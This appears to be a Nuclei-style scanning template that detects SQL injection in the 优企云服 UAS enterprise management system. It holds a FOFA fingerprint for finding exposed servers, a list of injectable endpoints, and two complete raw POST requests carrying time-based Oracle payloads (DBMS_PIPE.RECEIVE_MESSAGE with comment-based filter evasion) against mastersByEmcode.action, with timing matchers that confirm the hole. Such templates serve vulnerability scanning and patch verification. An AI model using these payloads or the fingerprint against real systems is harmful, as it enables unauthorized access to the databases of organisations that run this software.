id: youqi-cloud-uas-sqli
info:
  name: 优企云服 UAS 企业管理系统 SQL注入漏洞
  author: 0dayPoc
  severity: high
  description: |-
    fofa: con_hash="-448654846"
          多个接口存在SQL注入漏洞，攻击者可通过构造恶意输入执行任意SQL命令
          POST /common/login.action?username=admin&password=c4ca4238a0b923820dcc509a6f75849b&language=undefined&sob=YMZN_N* HTTP/1.1

      POST /common/sendChangePwdEmail.action HTTP/1.1
      em_code=1*&em_name=1
  tags: 优企云服
http:
- raw:
  - |
    POST /common/mastersByEmcode.action HTTP/1.1
    Host: {{Hostname}}
    X-Requested-With: XMLHttpRequest
    Accept: */*
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close
    sleep: sleep

    em_code=1'/**/and/**/DBMS_PIPE.RECEIVE_MESSAGE('h',5)='h
  - |
    POST /common/mastersByEmcode.action HTTP/1.1
    Host: {{Hostname}}
    X-Requested-With: XMLHttpRequest
    Accept: */*
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close
    sleep: sleep

    em_code=1'/**/and/**/DBMS_PIPE.RECEIVE_MESSAGE('h',8)='h
  matchers:
  - type: dsl
    dsl:
    - duration_1>=5 && duration_1<=6
    - duration_2>=8 && duration_2<=9
    condition: and
